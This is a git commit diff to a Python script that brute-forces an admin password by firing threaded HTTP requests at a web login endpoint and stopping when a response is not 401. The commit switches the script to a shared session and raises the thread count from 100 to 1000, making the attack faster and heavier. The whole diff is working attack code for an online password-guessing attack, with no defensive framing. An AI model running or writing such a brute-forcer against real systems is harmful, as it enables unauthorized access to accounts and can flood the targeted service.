4a9441691b77d4fae90b99e96dfd28bfefc42953
szkotgh <me@szk.kr>
2025-06-21 12:28:06 +0900

    update: same Session use

--- brute_force.py
+++ brute_force.py
@@ -18,38 +18,39 @@ def brute_force_password(length):
 
 def attempt_brute_force():
     global loop
-    while not stop_event.is_set():
-        test = brute_force_password(size)
-
-        if int(test[0], 16) % 6 != my_range:
-            continue
-
-        with lock:
-            if test in used_dict:
-                continue
-            used_dict.add(test)
-            loop += 1
-            current_loop = loop
-
+    with requests.Session() as session:
         while not stop_event.is_set():
-            try:
-                req = requests.get(
-                    f"{url}/auth?username=admin&authType=password&value={test}",
-                    timeout=5
-                )
-                print(f"Loop: {current_loop}, Password: {test}, Status Code: {req.status_code}, Response: {req.text}")
+            test = brute_force_password(size)
 
-                if req.status_code != 401:
-                    print("Found the password!", test)
-                    stop_event.set()
-                break
+            if int(test[0], 16) % 6 != my_range:
+                continue
 
-            except requests.RequestException as e:
-                print(f"[ERROR] Loop {current_loop}, Password: {test}, Error: {str(e)}")
-                time.sleep(cooldown_sec)
+            with lock:
+                if test in used_dict:
+                    continue
+                used_dict.add(test)
+                loop += 1
+                current_loop = loop
+
+            while not stop_event.is_set():
+                try:
+                    req = session.get(
+                        f"{url}/auth?username=admin&authType=password&value={test}",
+                        timeout=5
+                    )
+                    print(f"Loop: {current_loop}, Password: {test}, Status Code: {req.status_code}, Response: {req.text}")
+
+                    if req.status_code != 401:
+                        print("Found the password!", test)
+                        stop_event.set()
+                    break
+
+                except requests.RequestException as e:
+                    print(f"[ERROR] Loop {current_loop}, Password: {test}, Error: {str(e)}")
+                    time.sleep(cooldown_sec)
 
 threads = []
-num_threads = 100
+num_threads = 1000
 
 for _ in range(num_threads):
     t = threading.Thread(target=attempt_brute_force)
